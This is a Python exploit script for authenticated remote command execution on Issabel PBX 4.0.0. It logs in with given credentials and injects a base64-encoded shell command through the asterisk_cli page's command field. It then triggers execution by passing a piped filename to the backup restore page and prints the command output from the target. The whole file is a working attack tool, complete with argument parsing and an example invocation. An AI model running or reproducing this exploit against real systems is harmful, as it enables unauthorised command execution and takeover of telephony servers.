#!/usr/bin/python3
import requests
import argparse
import sys
import base64
import time
import warnings

# Add a generic header for the requests we will make later
generic_header = {
}

def check_len_args() -> None:
    # Check if the user has provided some arguments
    if len(sys.argv) <= 1:
        print(f"[-] Example usage: python3 {sys.argv[0]} -t 'https://192.1.1.1' -u 'pedrito' -p 'meelectrocutaste'")
        sys.exit(1)

def parse_arguments() -> argparse.Namespace:
    # Get argument/flags from users
    parser = argparse.ArgumentParser(prog=f'python3 {sys.argv[0]}', description='Issabel PBX 4.0.0 - Authenticated RCE')
    parser.add_argument('-t', '--target', type=str, help='Target IP (e.g., "192.1.1.1" or "https://192.1.1.1").', required=True)
    parser.add_argument('-u', '--user', type=str, help='Username.', required=True)
    parser.add_argument('-p', '--password', type=str, help='Password for this username.', required=True)
    parser.add_argument('-c', '--command', type=str, help="Unix command to execute on the machine.")
    parser.add_argument('--port', type=int, help='Port running Issabel PBX service. Default: 443.', default=443)
    parser.add_argument('--not-b64', action='store_true', help="Do not base64 encode the payload/command.")
    parser.add_argument('--show-warnings', action='store_false', help='Show warnings (if there are).')
    return parser.parse_args()

def check_if_https_in_url(url: str, port: int) -> str:
    # Check the 'target' argument the user has provided
    if not url.startswith('https://') and not url.startswith('http://'):
        return f"https://{url}:{port}"
    return f"{url}:{port}"

def injection_file_failed(response_text: str):
    # Search for the words 'Command' and 'failed.'. This might indicate that the payload could not be uploaded
    for line in response_text.split('\n'):
        if 'Command' and 'failed.' in line:
            return True, line
    return False, None

def sanitize_output(payload_response: str) -> str:
    # Sanitize payload output from undesired HTML code
    payload_response = payload_response.replace("<br>", '')
    payload_response = payload_response.replace("</div><script>alert('Migration Complete');</script>", '')
    index_of_greater_than = payload_response.find(">")
    if index_of_greater_than != -1:
        sanitized_response = payload_response[index_of_greater_than + 1:].strip()
        return sanitized_response
    return payload_response

def login_request(url: str, args: argparse.Namespace) -> requests.sessions.Session | None:
    # Login request to Issabel panel
    generic_cookie = {"issabelSession": "koglv53li3kpgba8ebol01brt4"}
    login_data = {"input_user": args.user, "input_pass": args.password, "submit_login": ''}
    print(f"[+] Trying to log in to {url!r} with credentials '{args.user}:{args.password}'...")
    try:
        session = requests.Session()
        r = session.post(url, cookies=generic_cookie, data=login_data, verify=False)
        if 'Incorrect username or password. Please try again.' in r.text:
            print("[-] Invalid username or password. Please check and try again.")
            sys.exit(1)
        if r.status_code != 200:
            print(f"[-] Ups! Something happened! Got status code {r.status_code!r}.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] An error occurred:\n{e}")
        sys.exit(1)
    print("[+] Authentication successful!")
    return session

def upload_payload(url: str, session: requests.sessions.Session, args: argparse.Namespace) -> str | None:
    if not args.command:
        print("[-] No command provided ('--command')")
        sys.exit(1)
    print("[+] Uploading the payload...")
    payload_url = f"{url}/index.php?menu=asterisk_cli"
    if not args.not_b64:
        encoded_command = base64.urlsafe_b64encode(args.command.encode()).decode().replace('\n', '')
        payload_injected = f"{{echo,{encoded_command}}}|{{base64,-d}}|bash"
    else:
        payload_injected = args.command
    payload_data = {'txtCommand': f'xmldoc dump /var/www/backup/x|{payload_injected}'}
    r = requests.post(payload_url, cookies=session.cookies.get_dict(), data=payload_data, verify=False)
    injection_failed, fail_line = injection_file_failed(r.text)
    if injection_failed:
        print("[-] Uploading malicious file failed...")
        print(fail_line)
        sys.exit(1)
    return payload_injected

def request_payload(url: str, session: requests.sessions.Session, injected_payload: str):
    print("[+] Requesting the uploaded payload...")
    time.sleep(2)
    payload_url = f"{url}/modules/backup_restore/restore.php?filename=x|{injected_payload}"
    r = requests.get(payload_url, cookies=session.cookies.get_dict(), verify=False)
    if "is not a file" in r.text:
        print("[-] Could not execute the command. This is the output:")
    if "Error!" in r.text:
        print("[-] We were able to remotely execute commands on the target but it gave an error:")
    print("\n" + sanitize_output(r.text))

def exploit(args: argparse.Namespace) -> None:
    url = check_if_https_in_url(args.target, args.port)
    session = login_request(url, args)
    payload = upload_payload(url, session, args)
    request_payload(url, session, payload)

if __name__ == "__main__":
    check_len_args()
    args = parse_arguments()
    if args.show_warnings:
        warnings.filterwarnings("ignore")
    exploit(args)
